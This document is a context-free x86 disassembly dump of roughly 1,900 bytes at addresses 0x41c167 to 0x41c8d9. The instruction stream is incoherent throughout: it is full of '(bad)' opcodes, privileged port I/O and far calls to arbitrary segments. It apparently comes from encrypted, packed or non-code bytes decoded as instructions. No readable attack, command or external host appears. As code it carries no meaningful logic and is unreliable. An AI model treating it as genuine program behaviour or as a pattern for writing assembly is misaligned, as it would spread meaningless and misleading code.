  41c167:	in     eax,0xc1
  41c169:	push   esp
  41c16a:	ds dec esi
  41c16c:	pop    es
  41c16d:	add    DWORD PTR [ecx+0x5eff93ab],esp
  41c173:	jg     0x41c0fb
  41c175:	ret    0xc919
  41c178:	retf   0xc434
  41c17b:	pop    eax
  41c17c:	pop    esi
  41c17d:	lahf   
  41c17e:	popa   
  41c17f:	sub    dl,BYTE PTR [ebp+0x4025b092]
  41c185:	mov    eax,ds:0xd4795b6d
  41c18a:	pop    ebx
  41c18b:	inc    esp
  41c18c:	mov    al,0x2a
  41c18e:	adc    BYTE PTR [ecx-0x711749c8],0xcf
  41c195:	je     0x41c136
  41c197:	mov    esi,0xe40b2c7
  41c19c:	add    dl,BYTE PTR [esi]
  41c19e:	in     al,dx
  41c19f:	fiadd  DWORD PTR [ebp-0x65]
  41c1a2:	adc    al,0x7e
  41c1a4:	xchg   DWORD PTR [ecx+0x66],esp
  41c1a7:	scas   al,BYTE PTR es:[edi]
  41c1a8:	push   ebx
  41c1a9:	retf   
  41c1aa:	mov    eax,0x89507b94
  41c1af:	xchg   esi,eax
  41c1b0:	sub    DWORD PTR ds:0xe58e8559,ecx
  41c1b6:	add    DWORD PTR [ebx],ebx
  41c1b8:	call   0x3878:0xa6dcfa45
  41c1bf:	and    bl,BYTE PTR [esi-0x6a]
  41c1c2:	jl     0x41c193
  41c1c4:	inc    ebp
  41c1c5:	pushf  
  41c1c6:	clc    
  41c1c7:	mov    ds:0x77c1aa78,al
  41c1cc:	idiv   esi
  41c1ce:	dec    edx
  41c1cf:	rcl    BYTE PTR [ecx],0x86
  41c1d2:	xor    DWORD PTR [esi-0x72249c5],edi
  41c1d8:	sbb    al,0x3c
  41c1da:	js     0x41c181
  41c1dc:	lahf   
  41c1dd:	inc    edx
  41c1de:	nop
  41c1df:	lds    ebp,FWORD PTR [ebp-0x7a]
  41c1e2:	jp     0x41c1ac
  41c1e4:	int    0x17
  41c1e6:	stos   BYTE PTR es:[edi],al
  41c1e7:	ret    
  41c1e8:	jp     0x41c227
  41c1ea:	and    al,0xc4
  41c1ec:	fs add al,0xfe
  41c1ef:	mov    esp,ebx
  41c1f1:	mov    bh,0x8d
  41c1f3:	add    BYTE PTR [edx-0x534d240d],0xa9
  41c1fa:	xor    esp,esi
  41c1fc:	call   0x49a8:0xdbd27dbc
  41c203:	adc    bh,BYTE PTR [eax-0x6877c796]
  41c209:	xchg   esi,eax
  41c20a:	mov    eax,ds:0xf4b92154
  41c20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c210:	adc    BYTE PTR [ecx],cl
  41c212:	sub    DWORD PTR ds:0xb5c9e5d1,eax
  41c218:	or     ebx,edx
  41c21a:	lds    sp,DWORD PTR [esi+0x72]
  41c21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c21f:	ss push ebp
  41c221:	dec    ebp
  41c222:	enter  0x1364,0xa8
  41c226:	mov    ds:0x3de74dbd,al
  41c22b:	or     BYTE PTR [esi],0xb1
  41c22e:	mov    eax,ds:0x7d16157b
  41c233:	inc    esp
  41c234:	push   esp
  41c235:	inc    ebp
  41c236:	xor    al,BYTE PTR [edx-0x36d94ac8]
  41c23c:	push   ds
  41c23d:	mov    ch,0xef
  41c23f:	jecxz  0x41c2a1
  41c241:	stos   DWORD PTR es:[edi],eax
  41c242:	mov    al,0x37
  41c244:	ins    DWORD PTR es:[edi],dx
  41c245:	inc    eax
  41c246:	(bad)  [eax+ebx*1-0x6d362d1b]
  41c24d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c24e:	(bad)  
  41c24f:	mov    edi,DWORD PTR [ebx+0x78]
  41c252:	jecxz  0x41c1f1
  41c254:	inc    esi
  41c255:	sub    al,0x39
  41c257:	sub    eax,0xe6d6639b
  41c25c:	fninit 
  41c25e:	ins    DWORD PTR es:[edi],dx
  41c25f:	mov    edi,0xf9241fce
  41c264:	(bad)  
  41c265:	aas    
  41c266:	and    DWORD PTR [ecx+0x9],edx
  41c269:	sub    al,0x85
  41c26b:	or     BYTE PTR [ebx],0xd2
  41c26e:	pop    ebx
  41c26f:	aaa    
  41c270:	dec    eax
  41c271:	popa   
  41c272:	cmp    al,0x51
  41c274:	inc    edx
  41c275:	in     eax,0xfe
  41c277:	in     al,dx
  41c278:	popf   
  41c279:	push   ss
  41c27a:	fnsave [ebx-0x322421b9]
  41c280:	js     0x41c27f
  41c282:	sbb    eax,0x1ae2ca5b
  41c287:	or     eax,0xea2922de
  41c28c:	das    
  41c28d:	xchg   DWORD PTR [eax+0x6a8d35fb],ebx
  41c293:	mov    edx,esi
  41c295:	inc    esp
  41c296:	xlat   BYTE PTR ds:[ebx]
  41c297:	mov    BYTE PTR [ebx-0x74],0x64
  41c29b:	out    0x6a,eax
  41c29d:	dec    ebp
  41c29e:	je     0x41c220
  41c2a0:	ror    BYTE PTR [edi],1
  41c2a2:	popa   
  41c2a3:	push   ebp
  41c2a4:	xor    al,BYTE PTR [eax]
  41c2a6:	add    BYTE PTR [esi+0x11],dl
  41c2a9:	scas   al,BYTE PTR es:[edi]
  41c2aa:	and    esi,edx
  41c2ac:	and    al,0x4c
  41c2ae:	call   0x15f:0xeac0f877
  41c2b5:	or     eax,DWORD PTR [ebx+0x79]
  41c2b8:	pop    ebp
  41c2b9:	int    0xc0
  41c2bb:	jle    0x41c288
  41c2bd:	pmulhw mm7,mm2
  41c2c0:	dec    esi
  41c2c1:	popf   
  41c2c2:	js     0x41c2cc
  41c2c4:	call   0x20df:0x30f81fd4
  41c2cb:	or     eax,DWORD PTR [ecx-0x60198897]
  41c2d1:	stos   BYTE PTR es:[edi],al
  41c2d2:	pushf  
  41c2d3:	jg     0x41c346
  41c2d5:	adc    DWORD PTR ds:0xd0a028ad,ebp
  41c2db:	sub    al,0x4d
  41c2dd:	scas   eax,DWORD PTR es:[edi]
  41c2de:	test   eax,0x6a500b9e
  41c2e3:	pusha  
  41c2e4:	dec    edx
  41c2e5:	dec    ebp
  41c2e6:	push   esi
  41c2e7:	push   esi
  41c2e8:	fld    TBYTE PTR [eax+0x69]
  41c2eb:	jns    0x41c367
  41c2ed:	clc    
  41c2ee:	xchg   bh,cl
  41c2f0:	retf   0x64ac
  41c2f3:	(bad)  [ebp+0x1552bfe5]
  41c2f9:	cmp    esp,DWORD PTR [ebx]
  41c2fb:	xchg   esi,edi
  41c2fd:	shr    BYTE PTR [ebp+0x6e],cl
  41c300:	cli    
  41c301:	test   ah,0x7b
  41c304:	xor    ch,BYTE PTR ds:0xded806f5
  41c30a:	test   al,0x91
  41c30c:	div    esi
  41c30e:	xor    dl,BYTE PTR [esi]
  41c310:	je     0x41c2b3
  41c312:	sub    DWORD PTR [esi-0x65efbb7d],ecx
  41c318:	iret   
  41c319:	jo     0x41c2a0
  41c31b:	add    esp,DWORD PTR [eax+0x20a2c8ff]
  41c321:	mov    ch,0xce
  41c323:	pusha  
  41c324:	nop
  41c325:	popf   
  41c326:	sub    eax,0x994de48c
  41c32b:	es aaa 
  41c32d:	sbb    BYTE PTR [esi-0x5d8253b4],0x7
  41c334:	int3   
  41c335:	call   0x9fdf9abb
  41c33a:	xchg   edi,eax
  41c33b:	inc    ebp
  41c33c:	mov    dl,0x2c
  41c33e:	rcl    DWORD PTR [eax-0x34],cl
  41c341:	hlt    
  41c342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c343:	std    
  41c344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c345:	(bad)  
  41c346:	sub    cl,ah
  41c348:	lock pusha 
  41c34a:	stos   DWORD PTR es:[edi],eax
  41c34b:	mov    gs,WORD PTR [ebx+0x3d8e8bea]
  41c351:	dec    ebx
  41c352:	les    esp,FWORD PTR [ecx]
  41c354:	out    dx,eax
  41c355:	std    
  41c356:	std    
  41c357:	pusha  
  41c358:	xor    edi,ebx
  41c35a:	dec    ebx
  41c35b:	jnp    0x41c3aa
  41c35d:	dec    ebx
  41c35e:	mov    eax,0x3cd9bae3
  41c363:	dec    edi
  41c364:	repz add al,0xa5
  41c367:	icebp  
  41c368:	jmp    0x41c3bf
  41c36a:	ja     0x41c378
  41c36c:	(bad)  
  41c36d:	aas    
  41c36e:	(bad)  
  41c36f:	ficomp WORD PTR [edi]
  41c371:	xor    DWORD PTR [ebp+0x692a0100],eax
  41c377:	in     eax,0x95
  41c379:	fldcw  WORD PTR [ebp+0x1b]
  41c37c:	mov    bl,0x19
  41c37e:	ficomp DWORD PTR [ecx-0x7]
  41c381:	inc    edi
  41c382:	daa    
  41c383:	xchg   esi,eax
  41c384:	mov    ah,0x4b
  41c386:	mov    edx,0x62fcf9e8
  41c38b:	push   0x58
  41c38d:	bound  eax,QWORD PTR ds:0x9f039878
  41c393:	in     eax,dx
  41c394:	inc    ebp
  41c395:	xchg   esp,eax
  41c396:	adc    ch,BYTE PTR [esi+eiz*2-0x4e9173ef]
  41c39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39e:	out    dx,al
  41c39f:	std    
  41c3a0:	(bad)  
  41c3a1:	in     eax,0xa0
  41c3a3:	or     eax,0xfbc210fd
  41c3a8:	dec    esp
  41c3a9:	imul   edx,DWORD PTR [edi+0x36],0x2a
  41c3ad:	mov    al,0x6c
  41c3af:	adc    al,0xde
  41c3b1:	std    
  41c3b2:	or     eax,0x1a5995ab
  41c3b7:	pusha  
  41c3b8:	xchg   ebx,eax
  41c3b9:	out    0x18,eax
  41c3bb:	mov    bh,0x81
  41c3bd:	push   ds
  41c3be:	jmp    0xef701a70
  41c3c3:	sbb    al,0xae
  41c3c5:	cmc    
  41c3c6:	stos   BYTE PTR es:[edi],al
  41c3c7:	arpl   dx,dx
  41c3c9:	sub    BYTE PTR [esi-0x56e47c55],ch
  41c3cf:	jl     0x41c420
  41c3d1:	inc    edi
  41c3d2:	popf   
  41c3d3:	or     al,0x4f
  41c3d5:	das    
  41c3d6:	xor    DWORD PTR [ecx-0x13d8d300],edi
  41c3dc:	cmp    BYTE PTR [eax+ebp*4-0x699016f2],0xd7
  41c3e4:	adc    al,0x22
  41c3e6:	mul    DWORD PTR [ebp+eiz*1+0x1a]
  41c3ea:	mov    ebp,0xf2edda5e
  41c3ef:	mov    dh,0x7c
  41c3f1:	cmp    esp,DWORD PTR [esi-0x64]
  41c3f4:	adc    BYTE PTR [ebp+0x36],al
  41c3f7:	aaa    
  41c3f8:	cmp    al,0xa4
  41c3fa:	pop    edx
  41c3fb:	push   eax
  41c3fc:	and    BYTE PTR [edi],dl
  41c3fe:	push   esp
  41c3ff:	loopne 0x41c38c
  41c401:	add    DWORD PTR [ecx+0x574c408e],esp
  41c407:	ret    
  41c408:	sub    eax,0x1339f156
  41c40d:	repnz nop
  41c40f:	(bad)  [ecx-0x3c]
  41c412:	inc    esi
  41c413:	adc    bl,bl
  41c415:	sub    ah,BYTE PTR [ecx+0x13f356c1]
  41c41b:	cwde   
  41c41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c41d:	icebp  
  41c41e:	ins    BYTE PTR es:[edi],dx
  41c41f:	push   eax
  41c420:	pusha  
  41c421:	push   0xffffffb0
  41c423:	arpl   bp,ax
  41c425:	cld    
  41c426:	and    ah,BYTE PTR [esi-0x22]
  41c429:	int    0x51
  41c42b:	or     eax,0x547c49be
  41c430:	pop    ebp
  41c431:	sbb    eax,0x6c9ed0a3
  41c436:	xor    edx,DWORD PTR [eax]
  41c438:	addr16 adc al,0x23
  41c43b:	je     0x41c447
  41c43d:	fisub  WORD PTR [esi+0x11]
  41c440:	xchg   edi,eax
  41c441:	sbb    bl,al
  41c443:	and    edi,DWORD PTR [ebp-0x5b3db10c]
  41c449:	xchg   esp,esi
  41c44b:	shl    BYTE PTR [ecx],1
  41c44d:	inc    ecx
  41c44e:	nop
  41c44f:	pushf  
  41c450:	xchg   ebx,eax
  41c451:	push   esi
  41c452:	sar    bl,0x45
  41c455:	jo     0x41c460
  41c457:	aas    
  41c458:	mov    WORD PTR [ecx],es
  41c45a:	(bad)  
  41c45b:	jb     0x41c449
  41c45d:	xchg   ebx,eax
  41c45e:	retf   0x6144
  41c461:	xor    esp,DWORD PTR [edx+0x3c]
  41c464:	mov    ecx,0xfc2969c5
  41c469:	data16 scas al,BYTE PTR es:[edi]
  41c46b:	aas    
  41c46c:	retf   0xf0ac
  41c46f:	sub    al,0xb6
  41c471:	inc    edx
  41c472:	mov    ecx,0x7b65bf00
  41c477:	addr16 (bad) 
  41c479:	fdiv   QWORD PTR [ecx]
  41c47b:	(bad)  
  41c47c:	imul   DWORD PTR [eax-0x43]
  41c47f:	push   ds
  41c480:	add    al,BYTE PTR [edi+0x5c]
  41c483:	jmp    0x2f3e:0xe6fa396e
  41c48a:	ja     0x41c4fa
  41c48c:	hlt    
  41c48d:	(bad)  
  41c48f:	xchg   edi,eax
  41c490:	sub    BYTE PTR [esi+eiz*1-0x4f],cl
  41c494:	mov    WORD PTR [ecx+0x221ead9f],ss
  41c49a:	mov    al,0xe0
  41c49c:	inc    ebx
  41c49d:	mov    eax,fs
  41c49f:	sub    bl,bh
  41c4a1:	les    eax,FWORD PTR [esi+0x259bd1b8]
  41c4a7:	jl     0x41c470
  41c4a9:	das    
  41c4aa:	test   edx,esp
  41c4ac:	mov    edx,DWORD PTR [ebp+esi*8+0x5]
  41c4b0:	nop
  41c4b1:	pop    edx
  41c4b2:	add    al,0x78
  41c4b4:	xor    ebx,DWORD PTR [eax]
  41c4b6:	or     al,0x1c
  41c4b8:	fld    st(5)
  41c4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4bb:	jo     0x41c51c
  41c4bd:	dec    DWORD PTR [eax]
  41c4bf:	(bad)  
  41c4c0:	into   
  41c4c1:	popa   
  41c4c2:	into   
  41c4c3:	mov    WORD PTR [edi],gs
  41c4c5:	jp     0x41c53e
  41c4c7:	mov    dh,0xf3
  41c4c9:	xchg   ax,ax
  41c4cb:	(bad)  
  41c4cc:	fisttp QWORD PTR [eax+edi*2-0x9558efb]
  41c4d3:	pushf  
  41c4d4:	jecxz  0x41c460
  41c4d6:	jbe    0x41c549
  41c4d8:	lea    edx,[ebp-0x5ddd85b9]
  41c4de:	ret    
  41c4df:	adc    al,0xab
  41c4e1:	cdq    
  41c4e2:	and    ecx,esp
  41c4e4:	ret    0xb3b0
  41c4e7:	jno    0x41c4a1
  41c4e9:	mov    bl,0xdc
  41c4eb:	fnstenv [ecx]
  41c4ed:	add    eax,0x6910c966
  41c4f2:	inc    edi
  41c4f3:	adc    al,0xcc
  41c4f5:	xchg   esp,eax
  41c4f6:	push   eax
  41c4f7:	mov    al,ds:0xc9e716b0
  41c4fc:	sub    bh,cl
  41c4fe:	iret   
  41c4ff:	iret   
  41c500:	fucomp st(5)
  41c502:	or     eax,0x374570ab
  41c507:	aas    
  41c508:	jae    0x41c576
  41c50a:	sbb    ah,BYTE PTR [eax-0x7f041aae]
  41c510:	dec    DWORD PTR [edi-0x2b4a8692]
  41c516:	lea    edx,[ebx+0x2b]
  41c519:	test   DWORD PTR [ecx-0x72f53b34],ebx
  41c51f:	push   ebp
  41c520:	leave  
  41c521:	jl     0x41c529
  41c523:	pushf  
  41c524:	cmc    
  41c525:	sbb    esi,DWORD PTR es:[edx]
  41c528:	stos   BYTE PTR es:[edi],al
  41c529:	fnstcw WORD PTR [eax+0x56ab7c83]
  41c52f:	loope  0x41c59a
  41c531:	loopne 0x41c4ef
  41c533:	out    dx,al
  41c534:	xchg   edi,eax
  41c535:	retf   
  41c536:	and    eax,0x5771e7df
  41c53b:	es es fwait
  41c53e:	imul   ebx,DWORD PTR [ecx],0x9d9367ed
  41c544:	nop
  41c545:	fcom   st(1)
  41c547:	jg     0x41c536
  41c549:	inc    eax
  41c54a:	nop
  41c54b:	cmp    DWORD PTR [ecx+0x6e],esp
  41c54e:	mov    cl,0x7b
  41c550:	pop    esi
  41c551:	fldenv [ebp-0x61aad00c]
  41c557:	les    ebx,FWORD PTR [eax]
  41c559:	les    ecx,FWORD PTR [ebx-0x10]
  41c55c:	rol    BYTE PTR [edx-0x37b299bb],cl
  41c562:	inc    ecx
  41c563:	jno    0x41c5a1
  41c565:	and    bh,BYTE PTR [ebx-0x29]
  41c568:	das    
  41c569:	scas   eax,DWORD PTR es:[edi]
  41c56a:	mov    esp,0x543c6e16
  41c56f:	mov    ebx,0xe8294a57
  41c574:	jno    0x41c5b0
  41c576:	lea    ebp,[ebx+esi*8+0x77]
  41c57a:	imul   esi,DWORD PTR [ebp-0x248a4e62],0x3cca35e6
  41c584:	jmp    0xdb7b:0xc999e0d1
  41c58b:	test   DWORD PTR [eax+0x8],ebp
  41c58e:	add    esi,DWORD PTR [ebp-0x151b7f17]
  41c594:	ds js  0x41c51a
  41c597:	mov    al,BYTE PTR [eax+0x20a53ea0]
  41c59d:	stos   DWORD PTR es:[edi],eax
  41c59e:	hlt    
  41c59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5a0:	or     eax,0xc063f930
  41c5a5:	psrad  mm0,QWORD PTR [edx]
  41c5a8:	pop    ds
  41c5a9:	fisub  DWORD PTR [esi+0x53]
  41c5ac:	pop    es
  41c5ad:	ins    DWORD PTR es:[edi],dx
  41c5ae:	pusha  
  41c5af:	or     DWORD PTR [edi-0x6d52251f],0x4b382b55
  41c5b9:	clc    
  41c5ba:	mov    edx,DWORD PTR [esi+ebp*8-0x4c]
  41c5be:	cmp    eax,0xa051c108
  41c5c3:	fidivr DWORD PTR [esi+0x66]
  41c5c6:	push   edi
  41c5c7:	hlt    
  41c5c8:	cmc    
  41c5c9:	hlt    
  41c5ca:	sub    al,0x80
  41c5cc:	sti    
  41c5cd:	mov    ebx,0x9cd642e1
  41c5d2:	fs rcr ah,0x58
  41c5d6:	mov    dl,0x4b
  41c5d8:	mov    edx,DWORD PTR [ebx]
  41c5da:	in     eax,dx
  41c5db:	add    DWORD PTR [ebx],edx
  41c5dd:	je     0x41c5f9
  41c5df:	add    al,0x8f
  41c5e1:	jbe    0x41c5f0
  41c5e3:	lahf   
  41c5e4:	push   esi
  41c5e5:	push   edi
  41c5e6:	stos   DWORD PTR es:[edi],eax
  41c5e7:	lea    eax,[ecx-0x36]
  41c5ea:	fisub  DWORD PTR [edx+0x2]
  41c5ed:	and    DWORD PTR [esi+0x7],edx
  41c5f0:	shl    dh,cl
  41c5f2:	imul   DWORD PTR [edx]
  41c5f4:	dec    esp
  41c5f5:	out    dx,eax
  41c5f6:	xchg   edx,eax
  41c5f7:	jb     0x41c5fb
  41c5f9:	shr    DWORD PTR [edx-0x22],cl
  41c5fc:	dec    esp
  41c5fd:	out    dx,eax
  41c5fe:	fs mov ch,0x4d
  41c601:	cmp    ah,BYTE PTR [ecx+0x70]
  41c604:	shl    dh,cl
  41c606:	push   es
  41c607:	test   ecx,eax
  41c609:	cli    
  41c60a:	cmp    ch,BYTE PTR [eax-0x50326b5e]
  41c610:	mov    cl,0xf3
  41c612:	stos   BYTE PTR es:[edi],al
  41c613:	das    
  41c614:	outs   dx,BYTE PTR ds:[esi]
  41c615:	and    esi,ecx
  41c617:	and    al,BYTE PTR [edx+0x1099826c]
  41c61d:	lods   eax,DWORD PTR ds:[esi]
  41c61e:	add    cl,BYTE PTR [ebx]
  41c620:	jl     0x41c5cf
  41c622:	pop    ss
  41c623:	xor    eax,0x87bc9bd9
  41c628:	cs daa 
  41c62a:	dec    edi
  41c62b:	push   ss
  41c62c:	loopne 0x41c675
  41c62e:	outs   dx,BYTE PTR ds:[esi]
  41c62f:	(bad)  
  41c630:	mov    bh,0x13
  41c632:	fdivr  QWORD PTR [ebx-0x4b378d13]
  41c638:	(bad)  
  41c639:	(bad)  
  41c63a:	scas   al,BYTE PTR es:[edi]
  41c63b:	sti    
  41c63c:	mov    dl,bh
  41c63e:	and    DWORD PTR [esi+0x50],esi
  41c641:	fmul   QWORD PTR [edx+0x4a]
  41c644:	std    
  41c645:	jmp    0xb2fa39da
  41c64a:	push   ss
  41c64b:	(bad)  
  41c64c:	sbb    eax,0x78c4241
  41c651:	mov    ebx,0x7d94b342
  41c656:	out    dx,eax
  41c657:	mov    bl,0xce
  41c659:	shr    bh,cl
  41c65b:	xchg   edx,eax
  41c65c:	inc    ebp
  41c65e:	test   edi,ecx
  41c660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c661:	mov    eax,ds:0xbc5b3ec9
  41c666:	push   edi
  41c667:	rol    eax,0x42
  41c66a:	ins    DWORD PTR es:[edi],dx
  41c66b:	sbb    esp,DWORD PTR [ebx]
  41c66d:	mov    ah,0xfc
  41c66f:	pop    ds
  41c670:	adc    edi,DWORD PTR [ebp-0x51]
  41c673:	xor    al,0xeb
  41c675:	and    bh,BYTE PTR [ecx]
  41c677:	adc    eax,0x3a64ef6e
  41c67c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41c67e:	push   cs
  41c67f:	sub    al,0xba
  41c681:	out    dx,eax
  41c682:	popa   
  41c683:	mov    esp,0x258b45ba
  41c688:	pop    eax
  41c689:	bound  ecx,QWORD PTR [edi]
  41c68b:	repz addr16 inc edi
  41c68e:	pop    esp
  41c68f:	fs adc eax,0x2d44e3c1
  41c695:	jae    0x41c654
  41c697:	mov    eax,0xbf216970
  41c69c:	pop    esp
  41c69d:	xor    al,0x7d
  41c69f:	ja     0x41c6b4
  41c6a1:	and    dh,BYTE PTR [ecx]
  41c6a3:	mov    ebp,0x647d0543
  41c6a8:	mov    bh,0x12
  41c6aa:	cli    
  41c6ab:	sbb    ebp,0x5a4dd7a9
  41c6b1:	jae    0x41c6f4
  41c6b3:	cmp    al,BYTE PTR [ecx+0x1b25d81a]
  41c6b9:	arpl   WORD PTR [esi-0x35],sp
  41c6bc:	loope  0x41c70d
  41c6be:	lods   eax,DWORD PTR ds:[esi]
  41c6bf:	or     cl,BYTE PTR [edx+0x56170057]
  41c6c5:	int    0x7c
  41c6c7:	inc    esp
  41c6c8:	(bad)  
  41c6c9:	cmp    al,BYTE PTR [esp+edx*2]
  41c6cc:	test   eax,0x5a44cd80
  41c6d1:	fdivr  DWORD PTR [ebx]
  41c6d3:	dec    ecx
  41c6d4:	ja     0x41c665
  41c6d6:	in     eax,dx
  41c6d7:	cli    
  41c6d8:	pop    DWORD PTR [edx-0xed19bd2]
  41c6de:	push   cs
  41c6df:	jb     0x41c68b
  41c6e1:	nop
  41c6e2:	stos   DWORD PTR es:[edi],eax
  41c6e3:	sub    DWORD PTR [esi],0xd7b3b01c
  41c6e9:	loop   0x41c6c3
  41c6eb:	cs ret 0x8b26
  41c6ef:	mov    bh,BYTE PTR [edx]
  41c6f1:	lods   eax,DWORD PTR ds:[esi]
  41c6f2:	arpl   WORD PTR [eax+eiz*4-0x80],si
  41c6f6:	pop    edi
  41c6f7:	test   DWORD PTR [eax+ebx*4-0x1e19bd77],esi
  41c6fe:	fnstenv [edi]
  41c700:	cmp    al,cl
  41c702:	or     ch,BYTE PTR [ebp+0x5e]
  41c705:	xchg   esp,eax
  41c706:	out    dx,eax
  41c707:	lock adc ebp,esi
  41c70a:	pop    eax
  41c70b:	mov    cl,0x71
  41c70d:	out    dx,al
  41c70e:	cs push edx
  41c710:	jle    0x41c6a8
  41c712:	inc    esi
  41c713:	or     al,0x7f
  41c715:	daa    
  41c716:	fistp  QWORD PTR [edx]
  41c718:	bound  edi,QWORD PTR [edi+0x36]
  41c71b:	call   0xf6ab:0x6aec7d8f
  41c722:	call   0x35a8:0x8c72ad93
  41c729:	neg    DWORD PTR [esi-0x77d0e423]
  41c72f:	lahf   
  41c730:	hlt    
  41c731:	cmp    esi,DWORD PTR [edx+edi*4-0x31faec83]
  41c738:	dec    edx
  41c739:	jns    0x41c767
  41c73b:	push   0xffffffd6
  41c73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c73e:	mov    esi,0x80bf3289
  41c743:	mov    ds:0x7a5db255,al
  41c748:	js     0x41c6dd
  41c74a:	mov    esi,0xe270a8e3
  41c74f:	sbb    DWORD PTR [edi-0x6ab4d19],esi
  41c755:	ret    0x7dac
  41c758:	jp     0x41c727
  41c75a:	push   edx
  41c75b:	mov    edi,0xf954f363
  41c760:	popa   
  41c761:	dec    esi
  41c762:	in     eax,0xf2
  41c764:	push   edi
  41c765:	fld    st(1)
  41c767:	outs   dx,DWORD PTR ds:[esi]
  41c768:	add    BYTE PTR [edi],dh
  41c76a:	stc    
  41c76b:	cmp    eax,0x5a321858
  41c770:	ss jg  0x41c753
  41c773:	mov    ds:0x629e86b6,eax
  41c778:	data16 rcr BYTE PTR [ebx-0x3f898d7],0x82
  41c780:	int    0xd1
  41c782:	scas   al,BYTE PTR es:[edi]
  41c783:	in     al,dx
  41c784:	ss push 0x4f5ce97a
  41c78a:	lods   al,BYTE PTR ds:[esi]
  41c78b:	iret   
  41c78c:	daa    
  41c78d:	sbb    eax,DWORD PTR [ebx]
  41c78f:	(bad)  
  41c790:	push   ebx
  41c791:	and    eax,0x33760ea
  41c796:	mov    eax,0x9771edf
  41c79b:	inc    esp
  41c79c:	mov    ds:0x227cde26,eax
  41c7a1:	mov    ch,0x4b
  41c7a3:	xchg   DWORD PTR [edx+0x59],ebp
  41c7a6:	jns    0x41c7e3
  41c7a8:	pop    ds
  41c7a9:	xor    BYTE PTR ds:0xb85d0e82,dl
  41c7af:	int    0xef
  41c7b1:	mov    ebp,esi
  41c7b3:	and    ch,dh
  41c7b5:	es xchg ch,cl
  41c7b8:	mov    ch,0xdb
  41c7ba:	arpl   sp,si
  41c7bc:	xchg   ebp,eax
  41c7bd:	pusha  
  41c7be:	das    
  41c7bf:	mov    bh,0xd5
  41c7c1:	loopne 0x41c795
  41c7c3:	sub    ecx,DWORD PTR [edi-0x77a2b3be]
  41c7c9:	xchg   esi,eax
  41c7ca:	sub    al,0x4b
  41c7cc:	xor    BYTE PTR [edi+0x7e],0xb6
  41c7d0:	mov    ch,ah
  41c7d2:	mov    bl,0x49
  41c7d4:	push   esi
  41c7d5:	adc    DWORD PTR [edx+0x4fb73517],edx
  41c7db:	and    cl,BYTE PTR [eax]
  41c7dd:	lock ins BYTE PTR es:[edi],dx
  41c7df:	lds    ecx,FWORD PTR [eax+ebx*2+0x816c867]
  41c7e6:	inc    ebp
  41c7e7:	(bad)  
  41c7e8:	loopne 0x41c7c3
  41c7ea:	retf   
  41c7eb:	int    0xbd
  41c7ed:	call   0xe4a2:0x562e74d0
  41c7f4:	sbb    BYTE PTR [ecx],ah
  41c7f6:	fucomp st(3)
  41c7f8:	pop    esp
  41c7f9:	pushf  
  41c7fa:	imul   eax,DWORD PTR cs:[ecx+0x78],0xf11a7e18
  41c802:	call   0x5f4c:0x8505730d
  41c809:	(bad)  
  41c80a:	aam    0x26
  41c80c:	mov    al,ds:0xff9bd865
  41c811:	loopne 0x41c83f
  41c813:	add    bl,dl
  41c815:	stc    
  41c816:	sbb    BYTE PTR ds:0x7a39e5a5,ah
  41c81c:	or     ebx,DWORD PTR [ecx-0x2cfc15ba]
  41c822:	add    ch,dl
  41c824:	adc    al,0x76
  41c826:	add    bh,dh
  41c828:	lock xchg edx,eax
  41c82a:	hlt    
  41c82b:	sub    BYTE PTR [edx+0x6d],ch
  41c82e:	lds    ecx,FWORD PTR [edi+edx*8]
  41c831:	ins    DWORD PTR es:[edi],dx
  41c832:	mov    al,0x1d
  41c834:	fcom   DWORD PTR [eax-0x3338a6f8]
  41c83a:	call   0xef10742f
  41c83f:	ins    DWORD PTR es:[edi],dx
  41c840:	in     al,dx
  41c841:	cwde   
  41c842:	int3   
  41c843:	xor    al,0xee
  41c845:	scas   eax,DWORD PTR es:[edi]
  41c846:	loop   0x41c874
  41c848:	or     DWORD PTR [ecx],esp
  41c84a:	fbld   TBYTE PTR [ebp-0x9]
  41c84d:	sbb    esp,DWORD PTR es:[eax-0x645b4b14]
  41c854:	add    DWORD PTR [ebp-0x2c313adc],0xfb071e3b
  41c85e:	lods   eax,DWORD PTR cs:[esi]
  41c860:	retf   
  41c861:	push   esi
  41c862:	push   0x33be0f11
  41c867:	dec    eax
  41c868:	call   0x38b3:0xeeff0dd6
  41c86f:	dec    ecx
  41c870:	lahf   
  41c871:	test   eax,0x976badd2
  41c876:	mov    bl,0xfb
  41c878:	sbb    DWORD PTR [eax-0x29],edi
  41c87b:	aas    
  41c87c:	nop
  41c87d:	xchg   esi,eax
  41c87e:	pop    ebx
  41c87f:	enter  0x810e,0x82
  41c883:	xchg   ebp,eax
  41c884:	call   0xeab7:0xda5510de
  41c88b:	sbb    cl,BYTE PTR [eax]
  41c88d:	or     BYTE PTR [ecx+0x1cda131a],0x71
  41c894:	xor    eax,0x62f60c93
  41c899:	pop    edx
  41c89a:	es sahf 
  41c89c:	inc    esp
  41c89d:	sub    al,BYTE PTR [esi-0x304c7cf7]
  41c8a3:	stos   BYTE PTR es:[edi],al
  41c8a4:	mov    ecx,0x6e979e7f
  41c8a9:	adc    esp,DWORD PTR [ecx-0x1869d0d5]
  41c8af:	dec    ebx
  41c8b0:	imul   BYTE PTR [ecx-0x50bddb7b]
  41c8b6:	ror    BYTE PTR [edx+ebx*8-0x6ad5c4f8],cl
  41c8bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8be:	(bad)  
  41c8bf:	jmp    0xb227:0x13ea96d3
  41c8c6:	add    DWORD PTR [esi+0x3607f432],eax
  41c8cc:	push   cs
  41c8cd:	sub    al,BYTE PTR [esi+eiz*1-0x12f1bbb8]
  41c8d4:	sahf   
  41c8d5:	into   
  41c8d6:	fstp   QWORD PTR [edx-0x6a]
  41c8d9:	cmc    
